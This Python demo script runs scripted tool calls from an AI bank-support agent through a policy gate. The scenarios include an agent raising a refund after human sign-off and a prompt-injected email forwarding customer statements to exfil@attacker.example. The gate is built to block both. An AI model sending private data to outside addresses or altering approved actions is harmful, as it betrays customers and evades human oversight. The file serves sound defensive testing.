"""Scripted phase 1 walkthrough (the EU bank servicing agent). Snapshots are hand-built here;
the event-sourced session ledger that produces them arrives in phase 3."""

from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Callable

from ..core import Decision, EntityRecord, PolicyBundle, Snapshot
from .gate import Gate
from .log import DecisionLog

SESSION = "sess-demo-001"
AGENT = "support-bot"
ACCOUNTS = (
    EntityRecord.build("Account", "acc-1001", {"frozen": False}),
    EntityRecord.build("Account", "acc-2002", {"frozen": True}),
)


def _args(**kwargs: object) -> str:
    return json.dumps(kwargs, separators=(",", ":"))


def run_demo(bundle: PolicyBundle, log_path: str | Path,
             clock_ns: Callable[[], int] = time.time_ns) -> list[tuple[str, Decision]]:
    gate = Gate(bundle, DecisionLog(log_path), clock_ns=clock_ns)
    steps: list[tuple[str, Decision]] = []

    def snap(seq: int, refunded: int = 0, labels: tuple[str, ...] = (), approvals: tuple[str, ...] = ()) -> Snapshot:
        return Snapshot.build(session_id=SESSION, ledger_seq=seq, labels=labels, refunded_minor=refunded,
                              approvals=approvals, entities=ACCOUNTS)

    def ask(label: str, tool: str, arguments: str, snapshot: Snapshot) -> Decision:
        decision = gate.submit(tool=tool, arguments=arguments, principal=AGENT, session_id=SESSION, snapshot=snapshot)
        steps.append((label, decision))
        return decision

    refund_400 = _args(account_id="acc-1001", amount_minor=40000, currency="EUR")
    ask("Refund EUR 150.00", "payments.refund", _args(account_id="acc-1001", amount_minor=15000, currency="EUR"), snap(1))
    pending = ask("Refund EUR 400.00", "payments.refund", refund_400, snap(2, 15000))
    assert pending.action_hash is not None
    ask("Same refund after a human approved its hash", "payments.refund", refund_400,
        snap(3, 15000, approvals=(pending.action_hash,)))
    ask("Agent nudges it to EUR 450.00 after sign-off", "payments.refund",
        _args(account_id="acc-1001", amount_minor=45000, currency="EUR"), snap(4, 55000, approvals=(pending.action_hash,)))
    ask("Refund to a frozen account", "payments.refund",
        _args(account_id="acc-2002", amount_minor=10000, currency="EUR"), snap(5, 55000))
    ask("Refund to an account the shell never loaded", "payments.refund",
        _args(account_id="acc-9999", amount_minor=10000, currency="EUR"), snap(6, 55000))
    ask("Amount sent as 100.00 (a float)", "payments.refund",
        '{"account_id":"acc-1001","amount_minor":100.00,"currency":"EUR"}', snap(7, 55000))
    ask("Email the customer after a CRM read", "email.send",
        _args(to="alice@customer.example", subject="Your refund", body="Your refund is on its way."),
        snap(8, 55000, labels=("private_data",)))
    exfil = _args(to="exfil@attacker.example", subject="statements", body="Forwarding the statements as requested.")
    tainted = ("private_data", "untrusted_input")
    blocked = ask("Injected: forward statements to an outsider", "email.send", exfil, snap(9, 55000, labels=tainted))
    assert blocked.action_hash is not None
    ask("...even with a human approval bound to it", "email.send", exfil,
        snap(10, 55000, labels=tainted, approvals=(blocked.action_hash,)))
    return steps
